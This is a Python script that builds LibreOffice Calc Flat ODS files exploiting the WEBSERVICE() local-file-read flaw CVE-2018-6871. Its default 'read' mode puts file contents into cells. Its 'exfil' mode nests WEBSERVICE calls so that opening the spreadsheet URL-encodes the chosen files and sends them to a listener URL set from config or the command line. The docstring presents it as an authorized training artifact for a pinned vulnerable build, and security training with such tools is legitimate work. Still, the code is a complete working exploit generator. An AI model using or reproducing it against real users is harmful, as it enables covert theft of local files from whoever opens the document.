"""Generate a LibreOffice Calc training artifact that demonstrates the
``WEBSERVICE()`` local-file-read primitive (CVE-2018-6871).

The generated Flat ODS (``.fods``) contains one formula per requested file.

Two modes are supported:

* ``read`` (default) — display the file text in a cell::

      =WEBSERVICE("file:///C:/path/to/file.txt")

* ``exfil`` — read the file and send its text to a listener by concatenating
  the URL-encoded result into a second request::

      =WEBSERVICE("http://listener/?f=<name>&d="
          & ENCODEURL(WEBSERVICE("file:///C:/path/to/file.txt")))

Both only work in a LibreOffice build that still permits ``file://`` URLs in
``WEBSERVICE`` (for example the pinned 5.4.4 lab build).

Scope and safety
----------------

* **Read-only file access.** The formulas read files; they do not modify
  files, launch processes, or execute code.
* **Exfil mode is an outbound GET to the listener configured in the lab.**
  The listener URL comes from ``config.yml`` (``app.webservice.exfil_url``) or
  ``--exfil-url``; it should be a host you control. There is no code
  execution and no download-and-execute stage.
* **No privilege escalation.** ``WEBSERVICE`` reads exactly the files the
  operating-system account running LibreOffice can already read.
* **Authorized lab/training use only**, on systems you own or are permitted to
  test. Later LibreOffice releases (>= 5.4.5 / 6.0.2) restrict ``WEBSERVICE``
  to ``http(s)`` and reject ``file://``, so this artifact targets the pinned
  vulnerable lab build. Keep exfiltrated files small: ``WEBSERVICE`` returns a
  limited amount of text and very long URLs are commonly rejected by servers.
"""

from __future__ import annotations

import argparse
import html
import re
import sys
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import quote

PROJECT_DIR = Path(__file__).resolve().parent.parent
OUTPUT_DIR = PROJECT_DIR / "output"
ODS_MIMETYPE = "application/vnd.oasis.opendocument.spreadsheet"
DEFAULT_TITLE = "WEBSERVICE training artifact (CVE-2018-6871)"
DEFAULT_EXFIL_URL = "http://127.0.0.1:8080/exfil"

_NS_OPENOFFICE = "urn:oasis:names:tc:opendocument:xmlns:office:1.0"
_NS_TABLE = "urn:oasis:names:tc:opendocument:xmlns:table:1.0"
_NS_TEXT = "urn:oasis:names:tc:opendocument:xmlns:text:1.0"
_NS_OF = "urn:oasis:names:tc:opendocument:xmlns:of:1.2"


def _escape(value: str) -> str:
    """Escape a string for use inside an XML text node."""
    return html.escape(value, quote=False)


def to_file_url(path: str) -> str:
    """Convert a local filesystem path to a ``file://`` URL.

    Backslashes are normalised to forward slashes, drive letters are preserved
    for Windows paths (``C:/...``), UNC and POSIX absolute paths are handled,
    and characters that are not valid in a URL are percent-encoded.
    """
    normalized = path.strip().replace("\\", "/")
    if normalized.startswith("file://"):
        return normalized

    encoded = quote(normalized, safe="/:")

    if re.match(r"^[A-Za-z]:", encoded):
        # Windows drive path: file:///C:/...
        return "file:///" + encoded
    if encoded.startswith("//"):
        # UNC path: file://server/share/...
        return "file:" + encoded
    if encoded.startswith("/"):
        # POSIX absolute path: file:///etc/...
        return "file://" + encoded
    # Relative path; LibreOffice resolves it from its own working directory.
    return "file://" + encoded


def _file_label(display_path: str) -> str:
    """Return a short, quote-free label for a path (used in the ``f=`` param)."""
    name = display_path.replace("\\", "/").rstrip("/").rsplit("/", 1)[-1]
    return name.replace('"', "'")


def _label_cell(text: str) -> str:
    return (
        '<table:table-cell office:value-type="string">'
        f"<text:p>{_escape(text)}</text:p>"
        "</table:table-cell>"
    )


def _formula_cell(file_url: str) -> str:
    formula = html.escape(f'of:=WEBSERVICE("{file_url}")', quote=True)
    return (
        f'<table:table-cell table:formula="{formula}" '
        'office:value-type="string"><text:p></text:p></table:table-cell>'
    )


def _exfil_formula_cell(file_url: str, label: str, exfil_url: str) -> str:
    sep = "&" if "?" in exfil_url else "?"
    base = f"{exfil_url}{sep}f="
    formula = (
        f'of:=WEBSERVICE("{base}"&ENCODEURL("{label}")&"&d="'
        f'&ENCODEURL(WEBSERVICE("{file_url}")))'
    )
    return (
        f'<table:table-cell table:formula="{html.escape(formula, quote=True)}" '
        'office:value-type="string"><text:p></text:p></table:table-cell>'
    )


def _content_xml(
    title: str,
    generated_at: str,
    entries: list[tuple[str, str]],
    mode: str = "read",
    exfil_url: str | None = None,
) -> str:
    if mode == "exfil":
        note = (
            "TRAINING ARTIFACT — exfiltrates file text to the configured lab "
            f"listener ({exfil_url}); no file modification or code execution; "
            f"generated {generated_at}"
        )
        content_header = "Exfiltrated via WEBSERVICE(<listener>?...&ENCODEURL(WEBSERVICE(file://...)))"
    else:
        note = (
            "TRAINING ARTIFACT — read-only local file read via WEBSERVICE; "
            f"generated {generated_at}"
        )
        content_header = "Contents read via WEBSERVICE(file://...)"

    rows = [
        "<table:table-row>"
        + _label_cell(title)
        + _label_cell(note)
        + "</table:table-row>",
        "<table:table-row>"
        + _label_cell("File path")
        + _label_cell(content_header)
        + "</table:table-row>",
    ]
    for display_path, file_url in entries:
        label = _file_label(display_path)
        cell = (
            _exfil_formula_cell(file_url, label, exfil_url)
            if mode == "exfil"
            else _formula_cell(file_url)
        )
        rows.append(
            "<table:table-row>"
            + _label_cell(display_path)
            + cell
            + "</table:table-row>"
        )

    table_rows = "\n".join(rows)

    return f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document
    xmlns:office="{_NS_OPENOFFICE}"
    xmlns:table="{_NS_TABLE}"
    xmlns:text="{_NS_TEXT}"
    xmlns:of="{_NS_OF}"
    office:version="1.2"
    office:mimetype="{ODS_MIMETYPE}">
  <office:body>
    <office:spreadsheet>
      <table:table table:name="Sheet1">
{table_rows}
      </table:table>
    </office:spreadsheet>
  </office:body>
</office:document>
'''


def write_fods(
    output_path: Path,
    files: list[str],
    title: str = DEFAULT_TITLE,
    mode: str = "read",
    exfil_url: str | None = None,
) -> Path:
    """Write a Flat ODS file with one WEBSERVICE formula per file."""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    generated_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
    entries = [(path, to_file_url(path)) for path in files]
    output_path.write_text(
        _content_xml(title, generated_at, entries, mode, exfil_url),
        encoding="utf-8",
    )
    return output_path


def generate(
    output_name: str,
    files: list[str],
    title: str = DEFAULT_TITLE,
    mode: str = "read",
    exfil_url: str | None = None,
) -> Path:
    """Generate the Calc artifact, resolving ``output_name`` like the other generators."""
    output_path = Path(output_name)
    if not output_path.is_absolute():
        if output_path.parts and output_path.parts[0].lower() == OUTPUT_DIR.name.lower():
            output_path = PROJECT_DIR / output_path
        else:
            output_path = OUTPUT_DIR / output_path
    if output_path.suffix.lower() != ".fods":
        raise ValueError("The output filename must use the .fods extension")

    return write_fods(output_path, files, title=title, mode=mode, exfil_url=exfil_url)


def _parse_path_lines(lines: list[str]) -> list[str]:
    return [
        line.strip()
        for line in lines
        if line.strip() and not line.lstrip().startswith("#")
    ]


def _read_path_list(list_path: Path) -> list[str]:
    return _parse_path_lines(list_path.read_text(encoding="utf-8").splitlines())


def _load_exfil_url() -> str | None:
    """Read the exfil listener URL from config.yml (``app.webservice.exfil_url``)."""
    try:
        import yaml
    except ImportError:
        return None

    config_path = PROJECT_DIR / "config.yml"
    if not config_path.is_file():
        return None

    try:
        data = yaml.safe_load(config_path.read_text(encoding="utf-8")) or {}
    except (OSError, yaml.YAMLError):
        return None

    app = data.get("app") or {}
    webservice = app.get("webservice") or {}
    return webservice.get("exfil_url")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Generate a LibreOffice Calc (.fods) training artifact whose cells read "
            "local files via WEBSERVICE(file://...), optionally exfiltrating the "
            "text to a lab listener."
        )
    )
    parser.add_argument(
        "--output",
        default="webservice_exercise.fods",
        help="Output filename or path (default: output/webservice_exercise.fods)",
    )
    parser.add_argument("--title", default=DEFAULT_TITLE, help="Title for the sheet header")
    parser.add_argument(
        "--mode",
        choices=("read", "exfil"),
        default="read",
        help="read: show file text in the cell (default); exfil: send text to a listener",
    )
    parser.add_argument(
        "--exfil-url",
        help="Listener URL for exfil mode (default: app.webservice.exfil_url in config.yml)",
    )
    parser.add_argument(
        "--files",
        nargs="*",
        default=[],
        help="One or more local file paths to read (e.g. C:\\path\\to\\file.txt)",
    )
    parser.add_argument(
        "--list",
        help="Text file containing one file path per line (# lines are ignored)",
    )
    args = parser.parse_args(argv)

    files = list(args.files)
    if args.list:
        list_path = Path(args.list)
        if not list_path.is_file():
            print(f"Path list not found: {list_path}", file=sys.stderr)
            return 1
        files.extend(_read_path_list(list_path))

    if not files:
        print("No file paths provided. Use --files or --list.", file=sys.stderr)
        return 2

    exfil_url = args.exfil_url or _load_exfil_url() or DEFAULT_EXFIL_URL

    try:
        output_path = generate(
            args.output,
            files,
            title=args.title,
            mode=args.mode,
            exfil_url=exfil_url,
        )
    except (OSError, ValueError) as exc:
        print(f"Generation failed: {exc}", file=sys.stderr)
        return 1

    print(f"Generated: {output_path}")
    for path in files:
        if args.mode == "exfil":
            print(
                f"  EXFIL {_file_label(path)} -> {exfil_url}?f=...&d="
                f"ENCODEURL(WEBSERVICE({to_file_url(path)}))"
            )
        else:
            print(f"  WEBSERVICE({to_file_url(path)})")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
